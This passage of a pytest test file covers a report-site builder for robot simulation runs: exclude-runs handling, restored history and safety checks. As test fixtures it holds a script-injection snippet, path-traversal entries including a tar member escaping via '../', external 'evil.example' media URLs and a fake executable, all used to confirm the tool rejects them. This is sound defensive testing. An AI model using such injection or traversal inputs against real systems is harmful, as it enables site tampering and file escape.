    assert not (reports / "unitree-g1/stock-mujoco-hallway/runs/921").exists()


def test_site_action_parses_whitespace_and_comma_separated_exclude_runs(tmp_path: Path, capsys):
    _make_run_folder(tmp_path / "in1/r1", "hallway", run_id="918", created="2026-11-18T06:00:00Z")
    _make_run_folder(tmp_path / "in1/r2", "hallway", run_id="919", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/r3", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1")

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    capsys.readouterr()
    outputs = site_action.run_site_action(
        {
            "INPUT_RUNS_DIR": str(tmp_path / "in2"),
            "INPUT_OUTPUT_DIR": "reports",
            "INPUT_RESTORE_HISTORY": "false",
            "INPUT_EXCLUDE_RUNS": "918, 920\n999999",
            "GITHUB_WORKSPACE": str(tmp_path),
            "GITHUB_EVENT_NAME": "push",
            "GITHUB_RUN_ID": "921",
        }
    )
    err = capsys.readouterr().err

    assert outputs["runs-count"] == "2"
    assert not (reports / "unitree-g1/stock-mujoco-hallway/runs/918").exists()
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/919").is_dir()
    assert not (reports / "unitree-g1/stock-mujoco-hallway/runs/920").exists()
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/921").is_dir()
    assert "918" in err
    assert "920" in err
    assert "999999" in err


def test_exclude_runs_ids_are_global_and_remove_the_run_from_every_scenario(tmp_path: Path, capsys):
    # A run folder is named after the workflow run, so one run ID can hold several scenarios.
    _make_run_folder(tmp_path / "in1/a", "hallway", run_id="919", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/b", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    _make_run_folder(
        tmp_path / "in1/c",
        "corner-left",
        variant="stock-mujoco-corner-left",
        run_id="920",
        created="2026-11-20T06:00:00Z",
    )
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1")
    assert (reports / "unitree-g1/stock-mujoco-corner-left/runs/920").is_dir()

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    capsys.readouterr()
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("920", "920"))
    err = capsys.readouterr().err

    assert not (reports / "unitree-g1/stock-mujoco-hallway/runs/920").exists()
    assert not (reports / "unitree-g1/stock-mujoco-corner-left").exists()
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/919").is_dir()
    assert err.count("::warning::Excluded restored run 920") == 2
    assert "stock-mujoco-corner-left/runs/920" in err
    assert "not found" not in err
    assert site_tool.read_json_object(reports / site_tool.MARKER)["runs"] == 2


def test_parse_exclude_runs_splits_on_commas_and_whitespace_and_drops_duplicates():
    assert site_tool.parse_exclude_runs("") == ()
    assert site_tool.parse_exclude_runs(" \n\t ") == ()
    assert site_tool.parse_exclude_runs("920, 921\r\n922\t920,921") == ("920", "921", "922")
    assert site_tool.parse_exclude_runs("920 921\n922\t920") == ("920", "921", "922")


def test_exclude_runs_skips_a_restored_run_with_unpublished_evidence(tmp_path: Path):
    reports, run = _restored_run(tmp_path)
    (run / "evidence").mkdir(exist_ok=True)
    (run / "evidence/payload.exe").write_bytes(b"MZ")
    reports_without_exclude = tmp_path / "reports-without-exclude"
    shutil.copytree(reports, reports_without_exclude)
    with pytest.raises(site_tool.SiteError, match="evidence of this type is not published"):
        _build_next_run(tmp_path, reports_without_exclude)

    _make_run_folder(tmp_path / "in3", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    site_tool.build(reports, tmp_path / "in3", exclude_runs=("920",))
    assert not run.exists()
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/921/index.html").is_file()


def test_an_excluded_run_is_not_restored_by_the_next_build_without_the_entry(tmp_path: Path):
    reports, run = _restored_run(tmp_path)
    report_html = run / "report.html"
    report_html.write_text(
        report_html.read_text(encoding="utf-8").replace(
            "</body>", "<script>alert(1)</script></body>", 1
        ),
        encoding="utf-8",
    )
    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("920",))

    # The deployed tree is what the next build restores; the entry has been removed.
    deployed = tmp_path / "deployed"
    shutil.copytree(reports, deployed)
    _make_run_folder(tmp_path / "in3", "hallway", run_id="922", created="2026-11-22T06:00:00Z")
    site_tool.build(deployed, tmp_path / "in3")

    runs_root = deployed / "unitree-g1/stock-mujoco-hallway/runs"
    assert sorted(p.name for p in runs_root.iterdir()) == ["921", "922"]
    assert "runs/920/" not in (deployed / "unitree-g1/stock-mujoco-hallway/index.html").read_text(
        encoding="utf-8"
    )


# ---------------------------------------------------------------- issue #40: exclude-runs follow-up


def test_exclude_runs_matching_is_exact_not_prefix_or_case_insensitive(tmp_path: Path, capsys):
    _make_run_folder(tmp_path / "in1/r1", "hallway", run_id="920", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/r2", "hallway", run_id="AbC", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1")

    _make_run_folder(
        tmp_path / "in2/n1", "hallway", run_id="NewRun", created="2026-11-21T06:00:00Z"
    )
    _make_run_folder(tmp_path / "in2/n2", "hallway", run_id="921", created="2026-11-22T06:00:00Z")
    capsys.readouterr()
    site_tool.build(
        reports,
        tmp_path / "in2",
        exclude_runs=("92", "9200", "abc", "newrun"),
    )
    err = capsys.readouterr().err

    runs_root = reports / "unitree-g1/stock-mujoco-hallway/runs"
    assert sorted(p.name for p in runs_root.iterdir()) == ["920", "921", "AbC", "NewRun"]
    assert site_tool.read_json_object(reports / site_tool.MARKER)["runs"] == 4
    for entry in ("92", "9200", "abc", "newrun"):
        assert f"exclude-runs entry {entry!r} was not found in restored history." in err


@pytest.mark.parametrize("bad_entry", ["../920", "a/b", "", "920\n921", ".hidden"])
def test_build_revalidates_exclude_runs_entries(tmp_path: Path, bad_entry: str):
    reports, run = _restored_run(tmp_path)
    before = {p: p.read_bytes() for p in run.rglob("*") if p.is_file()}

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    with pytest.raises(site_tool.SiteError, match="exclude-runs"):
        site_tool.build(reports, tmp_path / "in2", exclude_runs=(bad_entry,))

    assert {p: p.read_bytes() for p in run.rglob("*") if p.is_file()} == before
    assert not (reports / "unitree-g1/stock-mujoco-hallway/runs/921").exists()


def test_runs_skips_and_warns_unreadable_run_json_when_excluded(tmp_path: Path, capsys):
    _make_run_folder(tmp_path / "in1/r1", "hallway", run_id="919", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/r2", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1")

    bad_run = reports / "unitree-g1/stock-mujoco-hallway/runs/920"
    (bad_run / "run.json").write_text("{not valid json", encoding="utf-8")

    with pytest.raises(site_tool.SiteError, match="not valid JSON"):
        site_tool.runs(reports)

    capsys.readouterr()
    found = site_tool.runs(reports, exclude_runs={"920"})
    err = capsys.readouterr().err

    assert "::warning::Excluded restored run 920" in err
    assert [r["folder"] for r in found[("unitree-g1", "stock-mujoco-hallway")]] == ["919"]


def test_build_excludes_restored_run_with_unreadable_run_json_and_fails_when_not_excluded(
    tmp_path: Path, capsys
):
    _make_run_folder(tmp_path / "in1/r1", "hallway", run_id="919", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/r2", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1")

    bad_run = reports / "unitree-g1/stock-mujoco-hallway/runs/920"
    (bad_run / "run.json").write_text("{not valid json", encoding="utf-8")

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    reports_without_exclude = tmp_path / "reports-without-exclude"
    shutil.copytree(reports, reports_without_exclude)
    with pytest.raises(site_tool.SiteError, match="not valid JSON"):
        site_tool.build(reports_without_exclude, tmp_path / "in2")

    capsys.readouterr()
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("920",))
    err = capsys.readouterr().err

    assert "::warning::Excluded restored run 920" in err
    assert "not found" not in err
    assert not bad_run.exists()
    runs_root = reports / "unitree-g1/stock-mujoco-hallway/runs"
    assert sorted(p.name for p in runs_root.iterdir()) == ["919", "921"]
    assert site_tool.read_json_object(reports / site_tool.MARKER)["runs"] == 2


def test_runs_unsafe_path_still_fails_even_when_folder_is_excluded(tmp_path: Path):
    reports = tmp_path / "reports"
    unsafe = reports / ".bad_robot" / "stock-mujoco-hallway" / "runs" / "920"
    unsafe.mkdir(parents=True)
    (unsafe / "run.json").write_text("{not valid json", encoding="utf-8")

    with pytest.raises(site_tool.SiteError, match="unsafe run path"):
        site_tool.runs(reports, exclude_runs={"920"})


@pytest.mark.parametrize(
    "payload",
    [
        "{}",
        '{"run": {}}',
        '{"run": {"id": "920", "created": ""}}',
    ],
)
def test_runs_missing_run_created_raises_site_error_not_key_error(tmp_path: Path, payload: str):
    reports, run = _restored_run(tmp_path)
    (run / "run.json").write_text(payload, encoding="utf-8")

    with pytest.raises(site_tool.SiteError):
        site_tool.runs(reports)

    found = site_tool.runs(reports, exclude_runs={"920"})
    assert found == {}


def test_unsafe_archive_path_stays_fail_closed_even_with_exclude_runs(tmp_path: Path, monkeypatch):
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w") as tar:
        info = tarfile.TarInfo("reports/unitree-g1/stock-mujoco-hallway/runs/920/../escape.html")
        tar.addfile(info, io.BytesIO(b"bad"))
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as zf:
        zf.writestr("artifact.tar", tar_buf.getvalue())
    archive = zip_buf.getvalue()

    artifacts_list = [_artifact_entry(5, "main", 90, "2026-11-20T00:00:00Z")]

    def fake_request(url: str, token: str | None):
        path = urllib.parse.urlsplit(url).path.rstrip("/")
        if path == f"/repos/{REPO}":
            return io.BytesIO(json.dumps({"id": REPO_ID, "full_name": REPO}).encode())
        if path.endswith("/jobs"):
            return io.BytesIO(
                json.dumps({"jobs": [{"name": "deploy", "conclusion": "success"}]}).encode()
            )
        if "/actions/runs/" in path:
            return io.BytesIO(json.dumps(_workflow_run_payload(90, event="push")).encode())
        return io.BytesIO(json.dumps({"artifacts": artifacts_list}).encode())

    monkeypatch.setattr(reports_restore, "_request", fake_request)
    monkeypatch.setattr(reports_restore, "_open_once", lambda url, token: io.BytesIO(archive))

    _make_run_folder(tmp_path / "in1", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    with pytest.raises(site_tool.SiteError, match="Unsafe path"):
        site_action.run_site_action(
            {
                "INPUT_RUNS_DIR": str(tmp_path / "in1"),
                "INPUT_OUTPUT_DIR": "reports",
                "INPUT_RESTORE_HISTORY": "true",
                "INPUT_EXCLUDE_RUNS": "920",
                "INPUT_GITHUB_TOKEN": "tok",
                "GITHUB_WORKSPACE": str(tmp_path),
                "GITHUB_EVENT_NAME": "push",
                "GITHUB_REPOSITORY": REPO,
                "GITHUB_RUN_ID": "921",
            }
        )

    assert not (tmp_path / "reports/index.html").exists()
    assert not (tmp_path / "escape.html").exists()

    outputs = site_action.run_site_action(
        {
            "INPUT_RUNS_DIR": str(tmp_path / "in1"),
            "INPUT_OUTPUT_DIR": "reports",
            "INPUT_RESTORE_HISTORY": "true",
            "INPUT_RESET_HISTORY": "true",
            "INPUT_GITHUB_TOKEN": "tok",
            "GITHUB_WORKSPACE": str(tmp_path),
            "GITHUB_EVENT_NAME": "push",
            "GITHUB_REPOSITORY": REPO,
            "GITHUB_RUN_ID": "921",
        }
    )
    assert outputs["runs-count"] == "1"
    assert (tmp_path / "reports/unitree-g1/stock-mujoco-hallway/runs/921/index.html").is_file()


# ---------------------------------------------------------------- va#32 B1: many unknown scripts


@pytest.mark.timeout(30)
def test_many_unknown_scripts_are_cut_out_in_one_pass_with_few_warnings(capsys):
    import reports_render

    # Vera's PR 35 B1 probe: 200,000 copies of an unknown reporter-style script (about
    # 7 MiB). Cutting them out one at a time copies the page per script, which takes well
    # over a minute; one pass takes a few seconds, so the 30 s timeout is generous.
    count = 200_000
    script = "<script data-report-times>x</script>"
    page = _page(script * count)
    assert reports_render.checked_report_html(page, "probe") == _page("")
    warnings = capsys.readouterr().err.splitlines()
    assert len(warnings) == reports_render._SCRIPT_WARNING_EXAMPLES + 1
    assert f"removed {count} <script> elements" in warnings[-1]


def test_unknown_scripts_are_cut_out_exactly(capsys):
    import reports_render

    page = _page("a<script data-report-times>x</script>b<script data-eval-tabs>y</script>c")
    assert reports_render.checked_report_html(page, "probe") == _page("abc")
    assert len(capsys.readouterr().err.splitlines()) == 2


# ---------------------------------------------------------------- va#29 N2 & N3


@pytest.mark.parametrize(
    "markup",
    [
        "<img src='https://evil.example/x.png'>",
        "<video src='https://evil.example/x.png'></video>",
        "<video src='evidence/a.mp4' poster='https://evil.example/x.png'></video>",
    ],
)
def test_report_media_attributes_refuse_https_urls(markup: str):
    import reports_render

    with pytest.raises(site_tool.SiteError, match="relative link"):
        reports_render.checked_report_html(_page(markup), "probe")


@pytest.mark.parametrize(
    "markup",
    [
        "<img src='evidence/a.png'>",
        "<video src='evidence/a.mp4'></video>",
        "<video src='evidence/a.mp4' poster='evidence/a.png'></video>",
        "<a href='https://ok.example/'>x</a>",
    ],
)
def test_report_media_attributes_accept_relative_links_and_anchors_accept_https(markup: str):
    import reports_render

    page = _page(markup)
    assert reports_render.checked_report_html(page, "probe") == page


def test_invalid_utf8_report_html_is_refused_with_file_and_byte_offset(tmp_path: Path):
    folder = _make_run_folder(tmp_path / "in", "hallway", run_id="930")
    payload = b"<!doctype html><html><body><p>bad\xffbyte</p></body></html>\n"
    offset = payload.index(b"\xff")
    (folder / "report.html").write_bytes(payload)
    (folder / "SHA256SUMS").write_text(
        "".join(
            f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
            for n in site_tool.REPORT_FILES
        ),
        encoding="utf-8",
    )
    reports_dir = tmp_path / "reports"
    with pytest.raises(site_tool.SiteError) as exc_info:
        site_tool.build(reports_dir, tmp_path / "in")
    message = str(exc_info.value)
    assert "report.html" in message
    assert f"byte {offset}" in message
    assert not list(reports_dir.rglob("runs/930/index.html"))
    assert not (reports_dir / "index.html").exists()
    assert not (reports_dir / "site.json").exists()
